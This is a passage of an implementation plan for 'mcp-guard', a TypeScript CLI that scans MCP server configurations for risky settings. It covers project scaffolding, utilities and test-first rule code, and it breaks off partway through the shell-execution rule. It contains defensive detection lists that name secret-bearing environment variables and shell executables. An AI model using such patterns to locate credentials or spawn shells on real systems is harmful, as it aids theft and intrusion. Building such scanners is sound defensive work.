# mcp-guard MVP Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** v0.1.0 단일 명령 CLI `mcp-guard scan <path>`를 구현해 MCP 서버 설정을 정적 분석하고 위험 패턴(시크릿/셸/HTTP/파일시스템/Docker/파이프라인)을 식별·보고한다. CI까지 포함, npm publish는 별도 사이클.

**Architecture:** TypeScript ESM 단일 npm 패키지. `cli → loadConfig → normalizeServers → scanServer(rules) → reporter(text|json) → exit`. 룰은 순수 함수 모듈로 독립. 모든 출력은 redaction을 통과한다.

**Tech Stack:** Node 20+, TypeScript, pnpm, commander, jsonc-parser, zod, picocolors, vitest, tsup. CI는 GitHub Actions.

**Spec:** [docs/superpowers/specs/2026-05-10-mcp-guard-mvp-design.md](../specs/2026-05-10-mcp-guard-mvp-design.md)

---

## File Structure

신규 파일:

```
mcp-guard/
├─ package.json
├─ pnpm-lock.yaml                     (install로 생성)
├─ tsconfig.json
├─ tsup.config.ts
├─ vitest.config.ts
├─ .github/workflows/ci.yml
├─ src/
│  ├─ cli.ts                          엔트리포인트, commander 옵션, exit code
│  ├─ index.ts                        라이브러리 export
│  ├─ types.ts                        Severity, McpServerConfig, Finding, ScanResult, Rule
│  ├─ config/
│  │  ├─ loadConfig.ts                파일 read + jsonc 파싱
│  │  └─ normalizeServers.ts          mcpServers/servers 추출 + zod 검증
│  ├─ scanner/
│  │  ├─ scan.ts                      scanServer + scan
│  │  ├─ severity.ts                  순서 / max / fail-on 비교
│  │  └─ rules/
│  │     ├─ index.ts                  defaultRules 배열
│  │     ├─ secrets.ts                MCPG001
│  │     ├─ shellExecution.ts         MCPG002
│  │     ├─ dynamicRunner.ts          MCPG003
│  │     ├─ httpTransport.ts          MCPG004 + MCPG008
│  │     ├─ filesystemAccess.ts       MCPG005
│  │     ├─ dockerRisk.ts             MCPG006
│  │     ├─ suspiciousArgs.ts         MCPG007
│  │     └─ missingCommand.ts         MCPG009
│  ├─ reporters/
│  │  ├─ jsonReporter.ts              ScanResult → JSON 문자열
│  │  └─ textReporter.ts              ScanResult → ANSI 문자열
│  └─ utils/
│     ├─ redact.ts                    홈 디렉토리 → ~
│     ├─ command.ts                   basename + 확장자 제거
│     └─ paths.ts                     broad-path 검출 helper
└─ test/
   ├─ fixtures/
   │  ├─ safe.json
   │  ├─ risky.json
   │  ├─ jsonc.jsonc
   │  ├─ empty.json
   │  ├─ malformed.json
   │  ├─ missing-cmd.json
   │  ├─ placeholder-secret.json
   │  ├─ docker-socket.json
   │  ├─ pipeline-curl.json
   │  └─ public-https.json
   ├─ loadConfig.test.ts
   ├─ normalizeServers.test.ts
   ├─ severity.test.ts
   ├─ redact.test.ts
   ├─ command.test.ts
   ├─ paths.test.ts
   ├─ rules.secrets.test.ts
   ├─ rules.shellExecution.test.ts
   ├─ rules.dynamicRunner.test.ts
   ├─ rules.httpTransport.test.ts
   ├─ rules.filesystemAccess.test.ts
   ├─ rules.dockerRisk.test.ts
   ├─ rules.suspiciousArgs.test.ts
   ├─ rules.missingCommand.test.ts
   ├─ scan.test.ts
   ├─ reporter.text.test.ts
   ├─ reporter.json.test.ts
   └─ cli.test.ts
```

수정 파일: `README.md` (Task 25), `.gitignore` (Task 1, dist 추가).

---

## Task 1: 프로젝트 스캐폴딩

**Files:**
- Create: `package.json`
- Create: `tsconfig.json`
- Create: `tsup.config.ts`
- Create: `vitest.config.ts`
- Modify: `.gitignore`

- [ ] **Step 1.1: `package.json` 작성**

```json
{
  "name": "@nestarc/mcp-guard",
  "version": "0.1.0",
  "description": "Security scanner for MCP servers and configurations.",
  "type": "module",
  "bin": {
    "mcp-guard": "dist/cli.js"
  },
  "main": "dist/index.js",
  "module": "dist/index.js",
  "types": "dist/index.d.ts",
  "exports": {
    ".": {
      "types": "./dist/index.d.ts",
      "import": "./dist/index.js"
    }
  },
  "files": ["dist", "README.md", "LICENSE"],
  "scripts": {
    "dev": "tsx src/cli.ts",
    "build": "tsup",
    "test": "vitest run",
    "test:watch": "vitest",
    "typecheck": "tsc --noEmit"
  },
  "engines": {
    "node": ">=20"
  },
  "dependencies": {
    "commander": "^12.1.0",
    "jsonc-parser": "^3.3.1",
    "picocolors": "^1.1.1",
    "zod": "^3.23.8"
  },
  "devDependencies": {
    "@types/node": "^22.10.0",
    "tsup": "^8.3.5",
    "tsx": "^4.19.2",
    "typescript": "^5.7.2",
    "vitest": "^2.1.8"
  },
  "keywords": [
    "mcp",
    "model-context-protocol",
    "security",
    "scanner",
    "cli",
    "ai-agents",
    "devtools",
    "typescript",
    "nestarc"
  ],
  "license": "Apache-2.0",
  "repository": {
    "type": "git",
    "url": "git+https://github.com/nestarc/mcp-guard.git"
  },
  "homepage": "https://github.com/nestarc/mcp-guard#readme",
  "bugs": "https://github.com/nestarc/mcp-guard/issues",
  "packageManager": "pnpm@9.12.0"
}
```

- [ ] **Step 1.2: `tsconfig.json` 작성**

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "ESNext",
    "moduleResolution": "Bundler",
    "lib": ["ES2022"],
    "types": ["node"],
    "strict": true,
    "noUncheckedIndexedAccess": true,
    "exactOptionalPropertyTypes": true,
    "noImplicitOverride": true,
    "verbatimModuleSyntax": true,
    "isolatedModules": true,
    "esModuleInterop": true,
    "resolveJsonModule": true,
    "skipLibCheck": true,
    "declaration": true,
    "outDir": "dist",
    "rootDir": "."
  },
  "include": ["src", "test", "tsup.config.ts", "vitest.config.ts"]
}
```

- [ ] **Step 1.3: `tsup.config.ts` 작성**

```ts
import { defineConfig } from 'tsup';

export default defineConfig([
  {
    entry: { cli: 'src/cli.ts' },
    format: ['esm'],
    target: 'node20',
    dts: false,
    clean: true,
    sourcemap: false,
    splitting: false,
    shims: false,
    banner: { js: '#!/usr/bin/env node' },
  },
  {
    entry: { index: 'src/index.ts' },
    format: ['esm'],
    target: 'node20',
    dts: true,
    clean: false,
    sourcemap: false,
    splitting: false,
    shims: false,
  },
]);
```

> Two builds share `dist/`. The CLI build cleans first and adds the shebang; the library build runs after with `clean: false` and emits `.d.ts`.

- [ ] **Step 1.4: `vitest.config.ts` 작성**

```ts
import { defineConfig } from 'vitest/config';

export default defineConfig({
  test: {
    include: ['test/**/*.test.ts'],
    environment: 'node',
    globals: false,
    reporters: ['default'],
  },
});
```

- [ ] **Step 1.5: `.gitignore`에 `dist/` 추가**

기존 .gitignore에 이미 `dist`가 있는지 확인 (Nuxt 섹션에 있음). 부족하면 다음 라인을 파일 상단(handover 라인 다음)에 추가:

```
dist/
```

이미 있다면 스킵.

- [ ] **Step 1.6: 의존성 설치**

```
pnpm install
```

Expected: `pnpm-lock.yaml` 생성, `node_modules/` 생성. 에러 없음.

- [ ] **Step 1.7: typecheck 동작 확인**

```
pnpm typecheck
```

Expected: 에러 없음 (아직 src 파일 없으므로 빈 컴파일).

- [ ] **Step 1.8: 커밋**

```
git add package.json pnpm-lock.yaml tsconfig.json tsup.config.ts vitest.config.ts .gitignore
git commit -m "chore: initialize TypeScript CLI project scaffold"
```

---

## Task 2: 핵심 타입

**Files:**
- Create: `src/types.ts`

- [ ] **Step 2.1: `src/types.ts` 작성**

```ts
export type Severity = 'info' | 'low' | 'medium' | 'high' | 'critical';

export interface McpServerConfig {
  name: string;
  command?: string;
  args?: string[];
  env?: Record<string, unknown>;
  url?: string;
  transport?: string;
  raw: unknown;
}

export interface Finding {
  ruleId: string;
  severity: Severity;
  server: string;
  title: string;
  message: string;
  recommendation?: string;
  path?: string;
  metadata?: Record<string, unknown>;
}

export interface ScanResult {
  schemaVersion: '1';
  target: string;
  summary: {
    risk: Severity;
    serversScanned: number;
    findings: number;
  };
  findings: Finding[];
}

export interface Rule {
  id: string;
  run(server: McpServerConfig): Finding[];
}

export class LoadError extends Error {
  constructor(message: string, public readonly cause?: unknown) {
    super(message);
    this.name = 'LoadError';
  }
}
```

- [ ] **Step 2.2: typecheck**

```
pnpm typecheck
```

Expected: 에러 없음.

- [ ] **Step 2.3: 커밋**

```
git add src/types.ts
git commit -m "feat: add core types (Severity, McpServerConfig, Finding, ScanResult, Rule)"
```

---

## Task 3: severity 유틸리티

**Files:**
- Create: `src/scanner/severity.ts`
- Test: `test/severity.test.ts`

- [ ] **Step 3.1: 실패하는 테스트 작성 — `test/severity.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import { compareSeverity, maxSeverity, meetsThreshold } from '../src/scanner/severity.js';

describe('severity', () => {
  it('compareSeverity returns negative when a < b', () => {
    expect(compareSeverity('low', 'high')).toBeLessThan(0);
  });

  it('compareSeverity returns positive when a > b', () => {
    expect(compareSeverity('critical', 'medium')).toBeGreaterThan(0);
  });

  it('compareSeverity returns 0 when equal', () => {
    expect(compareSeverity('high', 'high')).toBe(0);
  });

  it('maxSeverity picks the highest severity', () => {
    expect(maxSeverity(['info', 'medium', 'high', 'low'])).toBe('high');
  });

  it('maxSeverity returns info for empty list', () => {
    expect(maxSeverity([])).toBe('info');
  });

  it('meetsThreshold: high meets high', () => {
    expect(meetsThreshold('high', 'high')).toBe(true);
  });

  it('meetsThreshold: medium does not meet high', () => {
    expect(meetsThreshold('medium', 'high')).toBe(false);
  });

  it('meetsThreshold: critical meets high', () => {
    expect(meetsThreshold('critical', 'high')).toBe(true);
  });
});
```

- [ ] **Step 3.2: 테스트 실패 확인**

```
pnpm test severity
```

Expected: FAIL — 모듈 없음.

- [ ] **Step 3.3: 구현 — `src/scanner/severity.ts`**

```ts
import type { Severity } from '../types.js';

const ORDER: Record<Severity, number> = {
  info: 0,
  low: 1,
  medium: 2,
  high: 3,
  critical: 4,
};

export function compareSeverity(a: Severity, b: Severity): number {
  return ORDER[a] - ORDER[b];
}

export function maxSeverity(severities: Severity[]): Severity {
  if (severities.length === 0) return 'info';
  let max: Severity = 'info';
  for (const s of severities) {
    if (compareSeverity(s, max) > 0) max = s;
  }
  return max;
}

export function meetsThreshold(value: Severity, threshold: Severity): boolean {
  return ORDER[value] >= ORDER[threshold];
}
```

- [ ] **Step 3.4: 테스트 통과 확인**

```
pnpm test severity
```

Expected: 모든 테스트 PASS.

- [ ] **Step 3.5: 커밋**

```
git add src/scanner/severity.ts test/severity.test.ts
git commit -m "feat(scanner): add severity comparison and threshold utilities"
```

---

## Task 4: redact 유틸리티

**Files:**
- Create: `src/utils/redact.ts`
- Test: `test/redact.test.ts`

- [ ] **Step 4.1: 실패하는 테스트 작성 — `test/redact.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import { redactHome } from '../src/utils/redact.js';

describe('redactHome', () => {
  it('replaces POSIX home prefix with ~', () => {
    expect(redactHome('/Users/alice/project', '/Users/alice')).toBe('~/project');
  });

  it('replaces Linux home prefix with ~', () => {
    expect(redactHome('/home/alice/code/foo', '/home/alice')).toBe('~/code/foo');
  });

  it('replaces Windows home prefix with ~ (backslash)', () => {
    expect(redactHome('C:\\Users\\alice\\project', 'C:\\Users\\alice')).toBe('~\\project');
  });

  it('replaces Windows home prefix with ~ (forward slash)', () => {
    expect(redactHome('C:/Users/alice/project', 'C:\\Users\\alice')).toBe('~/project');
  });

  it('does not modify other users home', () => {
    expect(redactHome('/Users/bob/project', '/Users/alice')).toBe('/Users/bob/project');
  });

  it('replaces home exact match with ~', () => {
    expect(redactHome('/Users/alice', '/Users/alice')).toBe('~');
  });

  it('returns input unchanged when no match', () => {
    expect(redactHome('/etc/hosts', '/Users/alice')).toBe('/etc/hosts');
  });

  it('handles empty home gracefully', () => {
    expect(redactHome('/Users/alice', '')).toBe('/Users/alice');
  });
});
```

- [ ] **Step 4.2: 테스트 실패 확인**

```
pnpm test redact
```

Expected: FAIL.

- [ ] **Step 4.3: 구현 — `src/utils/redact.ts`**

```ts
import os from 'node:os';

export function redactHome(input: string, home: string = os.homedir()): string {
  if (!home) return input;
  // Normalize Windows backslashes in home for prefix comparison.
  const candidates = new Set<string>([home]);
  if (home.includes('\\')) {
    candidates.add(home.replace(/\\/g, '/'));
  }
  for (const h of candidates) {
    if (input === h) return '~';
    if (input.startsWith(h)) {
      const rest = input.slice(h.length);
      // rest starts with separator (\ or /) — keep it as-is so output is ~/x or ~\x.
      return '~' + rest;
    }
  }
  return input;
}

export function redactFinding<T extends { message: string; recommendation?: string; path?: string }>(
  f: T,
  home: string = os.homedir()
): T {
  return {
    ...f,
    message: redactHome(f.message, home),
    recommendation: f.recommendation ? redactHome(f.recommendation, home) : f.recommendation,
    path: f.path ? redactHome(f.path, home) : f.path,
  };
}
```

- [ ] **Step 4.4: 테스트 통과 확인**

```
pnpm test redact
```

Expected: 모든 테스트 PASS.

- [ ] **Step 4.5: 커밋**

```
git add src/utils/redact.ts test/redact.test.ts
git commit -m "feat(utils): add home directory redaction"
```

---

## Task 5: command basename 유틸리티

**Files:**
- Create: `src/utils/command.ts`
- Test: `test/command.test.ts`

- [ ] **Step 5.1: 실패하는 테스트 작성 — `test/command.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import { commandBasename } from '../src/utils/command.js';

describe('commandBasename', () => {
  it('returns command itself when no path', () => {
    expect(commandBasename('bash')).toBe('bash');
  });

  it('strips POSIX directory', () => {
    expect(commandBasename('/usr/bin/bash')).toBe('bash');
  });

  it('strips Windows directory (backslash)', () => {
    expect(commandBasename('C:\\Program Files\\Git\\bin\\bash.exe')).toBe('bash');
  });

  it('strips Windows directory (forward slash)', () => {
    expect(commandBasename('C:/Windows/System32/cmd.exe')).toBe('cmd');
  });

  it('removes .exe extension', () => {
    expect(commandBasename('powershell.exe')).toBe('powershell');
  });

  it('removes .cmd extension', () => {
    expect(commandBasename('npm.cmd')).toBe('npm');
  });

  it('removes .bat extension', () => {
    expect(commandBasename('foo.bat')).toBe('foo');
  });

  it('removes .ps1 extension', () => {
    expect(commandBasename('script.ps1')).toBe('script');
  });

  it('lowercases for case-insensitive matching', () => {
    expect(commandBasename('BASH')).toBe('bash');
    expect(commandBasename('PowerShell.EXE')).toBe('powershell');
  });

  it('handles empty input', () => {
    expect(commandBasename('')).toBe('');
  });
});
```

- [ ] **Step 5.2: 테스트 실패 확인**

```
pnpm test command
```

Expected: FAIL.

- [ ] **Step 5.3: 구현 — `src/utils/command.ts`**

```ts
const STRIP_EXT = /\.(exe|cmd|bat|ps1)$/i;

export function commandBasename(command: string): string {
  if (!command) return '';
  // Take last segment after either / or \
  let basename = command;
  const lastSep = Math.max(command.lastIndexOf('/'), command.lastIndexOf('\\'));
  if (lastSep >= 0) basename = command.slice(lastSep + 1);
  return basename.replace(STRIP_EXT, '').toLowerCase();
}
```

- [ ] **Step 5.4: 테스트 통과 확인**

```
pnpm test command
```

Expected: 모든 테스트 PASS.

- [ ] **Step 5.5: 커밋**

```
git add src/utils/command.ts test/command.test.ts
git commit -m "feat(utils): add command basename helper (handles paths and exe/cmd/bat/ps1)"
```

---

## Task 6: paths(broad-path) 유틸리티

**Files:**
- Create: `src/utils/paths.ts`
- Test: `test/paths.test.ts`

- [ ] **Step 6.1: 실패하는 테스트 작성 — `test/paths.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import { isBroadPath, isParentTraversal } from '../src/utils/paths.js';

describe('isBroadPath', () => {
  it.each([
    '/',
    '~',
    '$HOME',
    '%USERPROFILE%',
    '/Users',
    '/home',
    '/Users/alice',
    '/home/alice',
    'C:',
    'C:\\',
    'C:/',
    'D:\\',
    'C:\\Users',
    'C:\\Users\\alice',
    'C:/Users/alice',
  ])('returns true for broad path %s', (p) => {
    expect(isBroadPath(p)).toBe(true);
  });

  it.each([
    '/Users/alice/project/docs',
    '/home/alice/code',
    'C:\\Users\\alice\\project',
    './local',
    'src',
    '',
  ])('returns false for narrow path %s', (p) => {
    expect(isBroadPath(p)).toBe(false);
  });
});

describe('isParentTraversal', () => {
  it.each(['..', '../..', '../../foo', '..\\bar'])('detects parent traversal in %s', (p) => {
    expect(isParentTraversal(p)).toBe(true);
  });

  it.each(['./foo', 'foo/..bar', 'src'])('does not flag %s', (p) => {
    expect(isParentTraversal(p)).toBe(false);
  });
});
```

- [ ] **Step 6.2: 테스트 실패 확인**

```
pnpm test paths
```

Expected: FAIL.

- [ ] **Step 6.3: 구현 — `src/utils/paths.ts`**

```ts
const EXACT_BROAD = new Set(['/', '~', '$HOME', '%USERPROFILE%', '/Users', '/home']);

const POSIX_HOME_USER_RE = /^\/(Users|home)\/[^/]+\/?$/;
const WINDOWS_DRIVE_ROOT_RE = /^[a-zA-Z]:[\\/]?$/;
const WINDOWS_USERS_RE = /^[a-zA-Z]:[\\/]Users[\\/]?$/i;
const WINDOWS_USERS_USER_RE = /^[a-zA-Z]:[\\/]Users[\\/][^\\/]+[\\/]?$/i;

export function isBroadPath(arg: string): boolean {
  if (!arg) return false;
  if (EXACT_BROAD.has(arg)) return true;
  if (POSIX_HOME_USER_RE.test(arg)) return true;
  if (WINDOWS_DRIVE_ROOT_RE.test(arg)) return true;
  if (WINDOWS_USERS_RE.test(arg)) return true;
  if (WINDOWS_USERS_USER_RE.test(arg)) return true;
  return false;
}

export function isParentTraversal(arg: string): boolean {
  if (!arg) return false;
  // Match a leading or standalone .. token
  return /^\.\.(?:[\\/]|$)/.test(arg) || arg.split(/[\\/]/).some((seg) => seg === '..');
}
```

- [ ] **Step 6.4: 테스트 통과 확인**

```
pnpm test paths
```

Expected: 모든 테스트 PASS.

- [ ] **Step 6.5: 커밋**

```
git add src/utils/paths.ts test/paths.test.ts
git commit -m "feat(utils): add broad-path and parent-traversal detection"
```

---

## Task 7: loadConfig

**Files:**
- Create: `src/config/loadConfig.ts`
- Create: `test/fixtures/empty.json` (early — needed for tests)
- Create: `test/fixtures/jsonc.jsonc`
- Create: `test/fixtures/malformed.json`
- Test: `test/loadConfig.test.ts`

- [ ] **Step 7.1: 최소 fixture 생성**

`test/fixtures/empty.json`:

```json
{}
```

`test/fixtures/jsonc.jsonc`:

```jsonc
{
  // a sample MCP config with comments
  "mcpServers": {
    "fs": {
      "command": "node",
      "args": ["./dist/server.js"]
    }
  }
}
```

`test/fixtures/malformed.json`:

```
{ "mcpServers": { "fs": { "command": "node",
```

(trailing comma/cut-off — invalid)

- [ ] **Step 7.2: 실패하는 테스트 작성 — `test/loadConfig.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import path from 'node:path';
import { loadConfig } from '../src/config/loadConfig.js';
import { LoadError } from '../src/types.js';

const fixture = (name: string) => path.resolve('test/fixtures', name);

describe('loadConfig', () => {
  it('parses an empty JSON object', async () => {
    const data = await loadConfig(fixture('empty.json'));
    expect(data).toEqual({});
  });

  it('parses JSONC with comments', async () => {
    const data = await loadConfig(fixture('jsonc.jsonc'));
    expect(data).toMatchObject({ mcpServers: { fs: { command: 'node' } } });
  });

  it('throws LoadError when file does not exist', async () => {
    await expect(loadConfig(fixture('does-not-exist.json'))).rejects.toBeInstanceOf(LoadError);
  });

  it('throws LoadError on malformed JSON', async () => {
    await expect(loadConfig(fixture('malformed.json'))).rejects.toBeInstanceOf(LoadError);
  });
});
```

- [ ] **Step 7.3: 테스트 실패 확인**

```
pnpm test loadConfig
```

Expected: FAIL — 모듈 없음.

- [ ] **Step 7.4: 구현 — `src/config/loadConfig.ts`**

```ts
import { readFile } from 'node:fs/promises';
import { parse, printParseErrorCode, type ParseError } from 'jsonc-parser';
import { LoadError } from '../types.js';

export async function loadConfig(filePath: string): Promise<unknown> {
  let raw: string;
  try {
    raw = await readFile(filePath, 'utf-8');
  } catch (err) {
    throw new LoadError(`Could not read file: ${filePath}`, err);
  }

  const errors: ParseError[] = [];
  const data = parse(raw, errors, { allowTrailingComma: true });
  if (errors.length > 0) {
    const first = errors[0]!;
    const code = printParseErrorCode(first.error);
    throw new LoadError(
      `Failed to parse ${filePath}: ${code} at offset ${first.offset}`
    );
  }
  return data;
}
```

- [ ] **Step 7.5: 테스트 통과 확인**

```
pnpm test loadConfig
```

Expected: 모든 테스트 PASS.

- [ ] **Step 7.6: 커밋**

```
git add src/config/loadConfig.ts test/loadConfig.test.ts test/fixtures/empty.json test/fixtures/jsonc.jsonc test/fixtures/malformed.json
git commit -m "feat(config): add loadConfig with JSONC support and LoadError"
```

---

## Task 8: normalizeServers

**Files:**
- Create: `src/config/normalizeServers.ts`
- Test: `test/normalizeServers.test.ts`

- [ ] **Step 8.1: 실패하는 테스트 작성 — `test/normalizeServers.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import { normalizeServers } from '../src/config/normalizeServers.js';
import { LoadError } from '../src/types.js';

describe('normalizeServers', () => {
  it('extracts mcpServers map', () => {
    const result = normalizeServers({
      mcpServers: {
        fs: { command: 'node', args: ['./server.js'] },
      },
    });
    expect(result).toHaveLength(1);
    expect(result[0]).toMatchObject({ name: 'fs', command: 'node', args: ['./server.js'] });
  });

  it('falls back to servers when mcpServers absent', () => {
    const result = normalizeServers({
      servers: {
        api: { url: 'https://example.com' },
      },
    });
    expect(result[0]).toMatchObject({ name: 'api', url: 'https://example.com' });
  });

  it('returns empty array and warns when neither key present', () => {
    const warn: string[] = [];
    const result = normalizeServers({}, { onWarn: (m) => warn.push(m) });
    expect(result).toEqual([]);
    expect(warn).toHaveLength(1);
    expect(warn[0]).toContain('mcpServers');
  });

  it('throws LoadError when raw is not an object', () => {
    expect(() => normalizeServers(null)).toThrow(LoadError);
    expect(() => normalizeServers([])).toThrow(LoadError);
    expect(() => normalizeServers('x')).toThrow(LoadError);
  });

  it('preserves raw entry', () => {
    const entry = { command: 'node', args: ['./s.js'], extra: 'preserved' };
    const result = normalizeServers({ mcpServers: { fs: entry } });
    expect(result[0]!.raw).toEqual(entry);
  });

  it('best-effort maps a malformed entry (missing command) without throwing', () => {
    const result = normalizeServers({ mcpServers: { broken: { foo: 'bar' } } });
    expect(result[0]!.name).toBe('broken');
    expect(result[0]!.command).toBeUndefined();
    expect(result[0]!.url).toBeUndefined();
  });

  it('coerces non-string command to undefined (best-effort)', () => {
    const result = normalizeServers({ mcpServers: { x: { command: 123 } } });
    expect(result[0]!.command).toBeUndefined();
  });
});
```

- [ ] **Step 8.2: 테스트 실패 확인**

```
pnpm test normalizeServers
```

Expected: FAIL.

- [ ] **Step 8.3: 구현 — `src/config/normalizeServers.ts`**

```ts
import { z } from 'zod';
import { LoadError, type McpServerConfig } from '../types.js';

const EntrySchema = z
  .object({
    command: z.string().optional(),
    args: z.array(z.string()).optional(),
    env: z.record(z.string(), z.unknown()).optional(),
    url: z.string().optional(),
    transport: z.string().optional(),
  })
  .passthrough();

export interface NormalizeOptions {
  onWarn?: (message: string) => void;
}

export function normalizeServers(raw: unknown, opts: NormalizeOptions = {}): McpServerConfig[] {
  if (raw === null || typeof raw !== 'object' || Array.isArray(raw)) {
    throw new LoadError('Top-level value must be an object');
  }
  const obj = raw as Record<string, unknown>;
  const map = (obj['mcpServers'] ?? obj['servers']) as Record<string, unknown> | undefined;
  if (!map || typeof map !== 'object' || Array.isArray(map)) {
    opts.onWarn?.('No `mcpServers` or `servers` key found at top level.');
    return [];
  }

  const out: McpServerConfig[] = [];
  for (const [name, entry] of Object.entries(map)) {
    const parsed = EntrySchema.safeParse(entry);
    if (parsed.success) {
      out.push({
        name,
        command: parsed.data.command,
        args: parsed.data.args,
        env: parsed.data.env,
        url: parsed.data.url,
        transport: parsed.data.transport,
        raw: entry,
      });
    } else {
      // best-effort: preserve only fields with the right primitive type
      const e = (entry ?? {}) as Record<string, unknown>;
      out.push({
        name,
        command: typeof e['command'] === 'string' ? (e['command'] as string) : undefined,
        args: Array.isArray(e['args']) && (e['args'] as unknown[]).every((x) => typeof x === 'string')
          ? (e['args'] as string[])
          : undefined,
        env:
          e['env'] && typeof e['env'] === 'object' && !Array.isArray(e['env'])
            ? (e['env'] as Record<string, unknown>)
            : undefined,
        url: typeof e['url'] === 'string' ? (e['url'] as string) : undefined,
        transport: typeof e['transport'] === 'string' ? (e['transport'] as string) : undefined,
        raw: entry,
      });
    }
  }
  return out;
}
```

- [ ] **Step 8.4: 테스트 통과 확인**

```
pnpm test normalizeServers
```

Expected: 모든 테스트 PASS.

- [ ] **Step 8.5: 커밋**

```
git add src/config/normalizeServers.ts test/normalizeServers.test.ts
git commit -m "feat(config): normalize mcpServers/servers map with zod best-effort"
```

---

## Task 9: 룰 MCPG001 — secrets

**Files:**
- Create: `src/scanner/rules/secrets.ts`
- Test: `test/rules.secrets.test.ts`

- [ ] **Step 9.1: 실패하는 테스트 작성 — `test/rules.secrets.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import { secretsRule } from '../src/scanner/rules/secrets.js';
import type { McpServerConfig } from '../src/types.js';

const server = (env: Record<string, unknown>): McpServerConfig => ({
  name: 's',
  env,
  raw: { env },
});

describe('secretsRule (MCPG001)', () => {
  it('flags GITHUB_TOKEN with non-empty long value as high', () => {
    const f = secretsRule.run(server({ GITHUB_TOKEN: 'ghp_aaaaaaaaaaaaaaaaaa' }));
    expect(f).toHaveLength(1);
    expect(f[0]!.severity).toBe('high');
    expect(f[0]!.ruleId).toBe('MCPG001');
  });

  it('does not include the secret value in message', () => {
    const f = secretsRule.run(server({ GITHUB_TOKEN: 'ghp_super_secret_value_12345' }));
    expect(f[0]!.message).not.toContain('ghp_super_secret_value_12345');
  });

  it('flags placeholder value with severity medium', () => {
    const f = secretsRule.run(server({ AWS_ACCESS_KEY_ID: '${AWS_ACCESS_KEY_ID}' }));
    expect(f[0]!.severity).toBe('medium');
  });

  it('flags empty string value with severity medium', () => {
    const f = secretsRule.run(server({ API_KEY: '' }));
    expect(f[0]!.severity).toBe('medium');
  });

  it('flags <placeholder> with severity medium', () => {
    const f = secretsRule.run(server({ PASSWORD: '<your-password>' }));
    expect(f[0]!.severity).toBe('medium');
  });

  it('flags short value (<8 chars) with severity medium', () => {
    const f = secretsRule.run(server({ SECRET_TOKEN: 'short' }));
    expect(f[0]!.severity).toBe('medium');
  });

  it('flags AWS_ prefix as secret', () => {
    const f = secretsRule.run(server({ AWS_SESSION_TOKEN: 'AKIAaaaaaaaaaaaa' }));
    expect(f).toHaveLength(1);
  });

  it('flags case-insensitive matches', () => {
    const f = secretsRule.run(server({ github_token: 'ghp_aaaaaaaaaaaaaaaa' }));
    expect(f).toHaveLength(1);
  });

  it('does not flag non-secret keys', () => {
    const f = secretsRule.run(server({ NODE_ENV: 'production', PORT: '3000' }));
    expect(f).toEqual([]);
  });

  it('does not flag when env is undefined', () => {
    expect(secretsRule.run({ name: 's', raw: {} })).toEqual([]);
  });

  it('flags non-string value (e.g. number) as high (cannot judge content)', () => {
    const f = secretsRule.run(server({ API_KEY: 123456789 }));
    expect(f).toHaveLength(1);
    expect(f[0]!.severity).toBe('high');
  });
});
```

- [ ] **Step 9.2: 테스트 실패 확인**

```
pnpm test rules.secrets
```

Expected: FAIL.

- [ ] **Step 9.3: 구현 — `src/scanner/rules/secrets.ts`**

```ts
import type { Finding, McpServerConfig, Rule, Severity } from '../../types.js';

const SUBSTRINGS = [
  'TOKEN',
  'SECRET',
  'PASSWORD',
  'PASSWD',
  'API_KEY',
  'APIKEY',
  'PRIVATE_KEY',
  'CREDENTIAL',
  'ACCESS_KEY',
];

const PREFIXES = ['AWS_', 'GCP_', 'GOOGLE_', 'AZURE_', 'OPENAI_', 'ANTHROPIC_', 'GITHUB_TOKEN', 'GITLAB_TOKEN'];

const PLACEHOLDER_RE = /^(\$\{[^}]+\}|<[^>]+>|your[-_].*[-_]here)$/i;

function looksSecret(key: string): boolean {
  const upper = key.toUpperCase();
  if (SUBSTRINGS.some((s) => upper.includes(s))) return true;
  if (PREFIXES.some((p) => upper.startsWith(p))) return true;
  return false;
}

function decideSeverity(value: unknown): Severity {
  if (typeof value !== 'string') return 'high';
  if (value === '') return 'medium';
  if (PLACEHOLDER_RE.test(value)) return 'medium';
  if (value.length < 8) return 'medium';
  return 'high';
}

export const secretsRule: Rule = {
  id: 'MCPG001',
  run(server: McpServerConfig): Finding[] {
    if (!server.env) return [];
    const out: Finding[] = [];
    for (const [key, value] of Object.entries(server.env)) {
      if (!looksSecret(key)) continue;
      const severity = decideSeverity(value);
      out.push({
        ruleId: 'MCPG001',
        severity,
        server: server.name,
        title: 'Secret-like value in environment variables',
        message: `Environment variable ${key} appears to contain a secret. Value not shown.`,
        recommendation:
          'Move secrets to a secure secret manager or prompt-based auth flow. Avoid committing real values.',
        path: `mcpServers.${server.name}.env.${key}`,
      });
    }
    return out;
  },
};
```

- [ ] **Step 9.4: 테스트 통과 확인**

```
pnpm test rules.secrets
```

Expected: 모든 테스트 PASS.

- [ ] **Step 9.5: 커밋**

```
git add src/scanner/rules/secrets.ts test/rules.secrets.test.ts
git commit -m "feat(rules): add MCPG001 secret-like env var detection"
```

---

## Task 10: 룰 MCPG002 — shellExecution

**Files:**
- Create: `src/scanner/rules/shellExecution.ts`
- Test: `test/rules.shellExecution.test.ts`

- [ ] **Step 10.1: 실패하는 테스트 작성 — `test/rules.shellExecution.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import { shellExecutionRule } from '../src/scanner/rules/shellExecution.js';
import type { McpServerConfig } from '../src/types.js';

const server = (command?: string, args?: string[]): McpServerConfig => ({
  name: 's',
  command,
  args,
  raw: { command, args },
});

describe('shellExecutionRule (MCPG002)', () => {
  it.each(['bash', 'sh', 'zsh', 'fish', 'dash', 'ksh', 'cmd', 'powershell', 'pwsh'])(
    'flags %s as high',
    (c) => {
      const f = shellExecutionRule.run(server(c));
      expect(f).toHaveLength(1);
      expect(f[0]!.severity).toBe('high');
      expect(f[0]!.ruleId).toBe('MCPG002');
    }
  );

  it('flags Windows path with .exe', () => {
    const f = shellExecutionRule.run(server('C:\\Windows\\System32\\cmd.exe'));
